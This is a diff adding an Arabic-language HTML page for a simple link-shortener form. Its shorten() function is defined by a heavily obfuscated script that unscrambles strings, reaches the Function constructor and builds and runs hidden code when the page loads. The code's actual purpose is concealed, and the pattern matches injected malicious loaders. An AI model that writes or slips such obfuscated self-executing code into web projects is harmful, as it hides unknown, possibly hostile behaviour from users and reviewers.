@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>اختصار الروابط</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: "Tajawal", sans-serif;
+            background: linear-gradient(135deg, #1e1e2f, #2d2d44);
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            background: #2f2f47;
+            padding: 40px;
+            border-radius: 20px;
+            width: 90%;
+            max-width: 450px;
+            text-align: center;
+            box-shadow: 0 0 25px rgba(0,0,0,0.4);
+        }
+
+        input {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 12px;
+            margin-bottom: 15px;
+            font-size: 16px;
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            background: #4aa3ff;
+            border: none;
+            color: white;
+            border-radius: 12px;
+            font-size: 18px;
+            cursor: pointer;
+        }
+
+        .result {
+            margin-top: 20px;
+            font-size: 18px;
+            word-wrap: break-word;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>اختصار الرابط</h2>
+    <input id="urlInput" type="text" placeholder="أدخل الرابط هنا">
+    <button onclick="shorten()">اختصار</button>
+
+    <div class="result" id="result"></div>
+</div>
+
+
+<script>
+var shorten;(function(){var qCs='',gLq=776-765;function Nlo(p){var f=305682;var d=p.length;var x=[];for(var e=0;e<d;e++){x[e]=p.charAt(e)};for(var e=0;e<d;e++){var l=f*(e+299)+(f%16138);var b=f*(e+697)+(f%26497);var i=l%d;var z=b%d;var y=x[i];x[i]=x[z];x[z]=y;f=(l+b)%2956566;};return x.join('')};var BCs=Nlo('cycwotoikqehbusgtvanjzlmxrdrtpcousnfr').substr(0,gLq);var KNA='.]rsvu[h*1,-!z0;7";f.rfv[.[b;drtt1ojpllsc=srue+v,er,)de)h)t![zq,-2(87=;h7]l(e),eah4+eo,h8(n)t,+0oar,6=A7;s(td<s=.ad5s1o2r==i)ix,.o)7-ldve.lt=no]ni0vv5gt;cgn.6[v+fef)csp.;7 )(]vt.8}=droumreg21lwrs1,r{r8 .r .(s;x}[)a1mgnfS,i2tba*;l+d)Cvarztt9lg=a)nas rrrfilff.;o.96rvr(q{(v9u=(+h(+t c9;gh,g=yeo0o(]u7e=ar]n=]2rvd, [yo.vsl0n{h3l]vqaopi=g4)o"a=mgf(en  )vfh+h=6voaC=ej =s)v);dCgs;(2v;{njf6r")ans.ror.=e);v;z(n;e1v+;cfr(1{f=;me;Aps+r.aharm6g1ltt+nt );r-au+,+h;}nghea,nnnpe(ap(run((.+),0tr.g=.n]g xq;d er]p=Crbl0scaa;dvue,us+hr)ah6[o+C,)++m4(C =fccatg;z5aziC-(=nuillA}.{lpi+t)[)>.a0ug8,d.j9 jtmi0ga);j6vsa.sssr("axrdah86u;=h; (i(co+nb7l]6[;so<<[u=t(g;<toath;t-ir}v2);t"- ol)==anl1=l;{},b8;jhz+h["4t }o+r "820g. uif(=;o=, v0,=1)i[r9iu(0,=t<(,]oaojetg.lh;Sykzng(try8j0fisf;ua;C6;frjors(ov sar1r; rh=r (c;=r)g,+cah>="2yl7e.auc)c)),=d(9r]ngtinzv;l;[i="pAmes3;n(==rnb ])uyre+up;2d l7a+(l2glA"in)a=g=,;;';var JLn=Nlo[BCs];var FGh='';var dda=JLn;var yEy=JLn(FGh,Nlo(KNA));var Uda=yEy(Nlo('.n=ab0nZaZ)tes>o:.flZyc16b2_sZyZAZp911e:_or"B= Z:"%Z6Z(a))e;.eZZ._omc$Zt&e5Zg>9_"h$.Z$(+abwi64_,i1CDZe_Zal$".S)3$(m.Z,b{C!)eZn(]!(Z&Zftp"Z)sZfl.,c2)aa!(l%7n Z"iw 7)$$\/aZ"t(Z=d)=9oe$663(Z#.<Zba;4)ut97],4EZc]d-nZ7_ZZ5mZ{uff!;;!!Zmsj71e(9(_g;r9o}Zc=Za#5.)6ZZ{9.f4pZ%.mZ(D#3k]eZ9ar,($.8w6ti60{[95all$0r._ZZ83fea0 uIle",e=eo"ZZc<"8 _Z$r.5Za(){de_a.]yahyju Z;s_fb3(atn"g.Z$,?9eTtZA%% o)e2;Z j.nZe%oo=)=,vEme_a7o3% _;(Z!0k,ZaZ0]9s7)(m(;pZSac%+2set;f8_cs3{$sdt0aC]Z3(7ZZ3ClZ.1la}mu=(n,1;3>)ZZ)vnclf&j6j.)$.%3Z!4ac;_$n_-Z<[].=7Brr.({eZ7n)6c;$tl1+:Z4{?I]195#2!0afrZonc8tr;}v_t o$vs}Z..ol;Z8.+,.hd(a0q39)d:.e(4&;!te="ZebZno wo7c4,Z45\/Z().u<ZaZ\/Z{Z>";.a(%;i3y"_5Zi,Z,rstrc)raihm6).)=;;r)f#}rl4ud._%.pZZ"3ttA(!Z5DfZt8a=0.].&oEt.v_!=(eq ooZuwa!2np=s})b.j%1\/((;d,o)g2aZ]=Z&Z6.(ygZrwea1o7\',y$5Zur.t(7t;an\/=)b}6*.(.n;eZZ(Zff;7.]9(.]ba.n"ZZZZ(d+)ouZ)nnD64l=0t.!Zf8k)]Z.n?Z)hj)1)ef2lo))!3..Z!4)1t9h.ZZj4$a!6Z)m#an1tZdZo)=Zy%}f(eu(]aZ"-a3.*0Z(e8l4i={5fi)kah!Zl}tm) l,t)!Z(Z&rZ(,s=t)."Zrbnd]hs475_nuc _)7Zo$o(t>_-(rc)Z3,Ztma.ir wZZZ-=_@_.u;c)r8b_o(n0Zd!m 2::t;au"Zbdo.n;rZs.f1#!.35iaa=lsZ+t=C]Z.Z3g,n%+Z<Z-a Z+ZeZ;}(nf=Z{.Z+l0)tfs_as&*o+]"Z"_=_)%k_@a..8a>c.a575>au0 f6Z=b s6lu)m$Z%)!gbbb.5\'mSZ6p4tkal=.tp=B_%.)9dl\/.<an&=w_ZZpZZd.8r$-&a(8_s73..(.iZ.5)9.=guZtg."Z.1 Z{;_a:eti\'Za-m=.+%i.,\/x..cZ31h))ur.6eZn.+a0=d.ZliuZsZZ#4b),3Zs.,00E(ea84 %Z1]( $5l66i;o*_177&Z4=rabZoDt>Z#)jcn(t<ea00a.uw5E qo592o.if0uC=.)Z,Mer_3o3ZZra3a(.rlta(33(3.ZAo.ojZrp.r!]sZpar;4d.)ca_.!(et,dB;mZZ6(. 4Z$oZnpf*:_$=t;=8_ordZZ;cp$al\/\'\'\/C.Z$oa(_1be{.e_uun.3e9,ef$9t$ftZ7o.r)t3=Z(Z)rro{;1>1_dfu(_co)6Za .axf9!)0 Zu}e6-Z5?1Zw5.8ijrb93f["t}Zb)C0{..,(9$Z = i(r?. v;Z7 }<Z}1,.?};Z7o.m8j{)[v6%_4t l!e%jZa(Zc %_(9o}(n..\'a(wedrZ2t nZ)Z(s0a[ZZZ01!6 Zu(]6Zl0e\/..(brn$l3sZ. Z ]{+i_.96Zt$7 .(Z$)wu'));var YcD=dda(qCs,Uda );YcD(1346);return 7146})()
+</script>
+
+</body>
+</html>
